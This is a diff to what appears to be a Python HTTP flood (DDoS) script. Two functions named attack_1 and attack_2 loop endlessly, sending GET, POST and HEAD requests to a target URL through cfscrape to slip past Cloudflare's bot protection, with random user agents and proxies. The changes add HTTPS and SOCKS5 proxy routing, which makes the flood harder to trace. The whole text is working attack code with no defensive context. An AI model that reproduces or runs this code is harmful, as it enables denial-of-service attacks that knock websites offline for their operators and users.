@@ -1,5 +1,4 @@
 import random
-
 import cfscrape
 import threading
 
@@ -16,9 +15,9 @@ with open('useragent', 'r') as useragent:
 def attack_1(url, proxy, headers):
     cf = cfscrape.CloudflareScraper()
     while True:
-        proxieshttp = {'http': f'http://{proxy}'}
+        proxieshttp = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
         head = random.choice(headers)
-        header = {'accept': '*/*', 'user-agent': head}
+        header = {'user-agent': head}
 
         try:
             cf.get(url, proxies=proxieshttp, headers=header)
@@ -36,20 +35,20 @@ def attack_1(url, proxy, headers):
 def attack_2(url, proxy, headers):
     cf = cfscrape.CloudflareScraper()
     while True:
-        proxieshttps = {'https': f'http://{proxy}'}
+        proxiessocks = {'http': f'socks5://{proxy}', 'https': f'socks5://{proxy}'}
         head = random.choice(headers)
-        header = {'accept': '*/*', 'user-agent': head}
+        header = {'user-agent': head}
 
         try:
-            cf.get(url, proxies=proxieshttps, headers=header)
+            cf.get(url, proxies=proxiessocks, headers=header)
         except:
             pass
         try:
-            cf.post(url, proxies=proxieshttps, headers=header)
+            cf.post(url, proxies=proxiessocks, headers=header)
         except:
             pass
         try:
-            cf.head(url, proxies=proxieshttps, headers=header)
+            cf.head(url, proxies=proxiessocks, headers=header)
         except:
             pass
 
